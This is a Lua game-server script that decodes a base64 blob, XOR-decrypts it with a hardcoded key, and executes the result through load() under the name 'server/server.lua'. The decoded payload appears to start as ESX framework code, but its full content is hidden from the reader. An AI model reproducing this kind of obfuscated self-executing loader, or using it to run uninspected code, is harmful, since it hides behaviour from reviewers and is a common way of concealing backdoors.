local __k = 'a12348e2ba594a74891e4c1a4068fba0'
local __d = [[JGJqEwkYAEoSDkdNRzoQUUtmVB1ABl8FUVQRZVwFBEQyWVNBUVwqUAgEVk0cSD1YV1pQCRQCUgJRQ0V1CQYEEFwRGnBbVgNbBU90WlcEREcYWF8BFCBeD1JZURYnAQJVEkIcXltcABtCDkcZEwRETB8zO0gZQ3ACV1VFS0YBCVUCWjh2Z2BLYAcGXEpABEVnXUtHAEYgUA1YUldbDUpGRQ9YVVJGWQJXWAJUV3UCVFFLShZJFAVED1dEX1cIShJfFENRVhgYBlBOQVJYRgBQUXNcSEw+QxFBFFxZWwcOQVdBDBJwW1YDWwVPclhGAFBRS2JWBEYCVgR/VU9lbEJBEEFYVBNaVxESBUFBUVEPPRQYGRFFFEMRAlYYUFkKEQQZaxESExQYRRJCE1BNQRNZPhgZEUVRDVVrPhAWGEZPTBAyRVNdUFkJXQwEFVRbBVIOGFxHAEYaXg9REFVZCEIOQARfOBMUGEVbBEFUWlcEREd1VlUAFF4MQRNDQlkIBgBcDl9XFBRMDVcMaxUZFEEXFBgZUgccF0MUURk8GEZCQRBBERJBUUwQQAxrFRkUQVJaXDM7RRRDEQ1bU1dURhoxXABIV0EUBUV3MTkbflEVZ1hZQFQXchFeDH1UHksJFxNTBBg4ExQYRVsEQVtWQEFPZFRYSABGQ14TFF5ZTEYaMVwASFdBGlIKUEIVXVxaaxcUGBkRRRRDUgMcVldUFQdIOkEREhMUGEUSEARBTEYPPRQYGREAWgc7axQQFhgFAElIMV1TSlFKS1gNAxtXVQxSFAUEEQIaKV4DHTpTVgJLaw==]]
local __b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function __b64dec(data)
  data = data:gsub('[^' .. __b .. '=]', '')
  local t, n = {}, 1
  local val, bits = 0, 0
  for i = 1, #data do
    local c = data:sub(i, i)
    if c ~= '=' then
      val = val * 64 + (__b:find(c, 1, true) - 1)
      bits = bits + 6
      if bits >= 8 then
        bits = bits - 8
        local byte = math.floor(val / 2^bits)
        val = val % 2^bits
        t[n] = string.char(byte)
        n = n + 1
      end
    end
  end
  return table.concat(t)
end

local function __xor(data, key)
  local out = {}
  local klen = #key
  for i = 1, #data do
    local kb = key:byte(((i - 1) % klen) + 1)
    out[i] = string.char(data:byte(i) ~ kb)
  end
  return table.concat(out)
end

local __src = __xor(__b64dec(__d), __k)
local __f, __err = load(__src, '@server/server.lua', 'bt', _ENV)
if not __f then error(__err) end
__f()